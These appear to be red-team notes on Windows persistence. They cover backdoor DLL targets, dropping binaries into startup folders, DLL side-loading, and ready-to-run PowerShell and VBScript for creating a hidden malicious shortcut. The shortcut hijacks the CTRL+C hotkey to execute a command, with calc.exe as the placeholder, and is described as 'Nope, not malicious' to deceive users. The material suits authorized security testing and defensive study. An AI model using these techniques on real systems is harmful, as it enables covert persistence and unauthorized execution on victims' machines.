## Backdoor DLLs
- [RDP](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/)
- ADFS
- LAPS
- Exchange Macros
- JEA
***
### Startup folder

Just drop a binary. Classic 😎🚩

In current user folder, will trigger when current user signs in:

```plaintext
c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot _and_ when any user signs on:

```plaintext
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

***

## DLL-Side-Loading/PATH Hijacking
Download signed executables with known DLL-Side-Loading/PATH Hijacking vulns. Copy them and the forged DLLs to get code execution. [DLL Side-loading Appverif.exe – Fat Rodzianko](https://fatrodzianko.com/2020/02/15/dll-side-loading-appverif-exe/)


***

## Crafting Malicious LNK files via COM
When it comes to execution, what many people don’t know is that Windows shortcuts can be registered with a shortcut key, which in this blog will also be referred to as an “activation key” or “trigger key”.

[![](https://v3ded.github.io/img/blog/abusing-lnk-features-for-initial-access-and-persistence/shortcut_key.png)](https://v3ded.github.io/img/blog/abusing-lnk-features-for-initial-access-and-persistence/shortcut_key.png)

Process Hacker 2 LNK shortcut without an activation key

If a shortcut with an activation key is placed on a user’s desktop, every invocation of the specified key combination will cause the shortcut to execute. Armed with this knowledge we can set the activation key to a frequently used key combination such as `CTRL+C`, `CTRL+V`, `CTRL+Z` and so forth. If the machine is in use by someone who uses shortcuts at least intermittently, we should be able to achieve arbitrary execution on the system. This ideology is the core of our attack methodology.

> **Note:** Explorer only allows shortcuts starting with the CTRL+ALT sequence. Other sequences need to be programmatically set via COM (see the following section).

### Powershell
```powershell
# The following PowerShell script can be used to create a malicious shortcut with a custom activation key:

$path                      = "$([Environment]::GetFolderPath('Desktop'))\FakeText.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c calc.exe"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
```

### VBA, VBScript

```vbnet
Set wshell = CreateObject("WScript.Shell")

Dim path
path = wshell.SpecialFolders("Desktop") & "/FakeText.lnk"

Set shortcut              = wshell.CreateShortcut(path)
shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
shortcut.WindowStyle      = 7
shortcut.TargetPath       = "cmd.exe"
shortcut.Arguments        = "/c calc.exe"
shortcut.WorkingDirectory = "C:"
shortcut.HotKey           = "CTRL+C"
shortcut.Description      = "Nope, not malicious"
shortcut.Save

' Optional if we want to make the link invisible (prevent user clicks)
Set fso       = CreateObject("Scripting.FileSystemObject")
Set mf        = fso.GetFile(path)
mf.Attributes = 2
```

### References
[Abusing LNK "Features" for Initial Access and Persistence (v3ded.github.io)](https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence)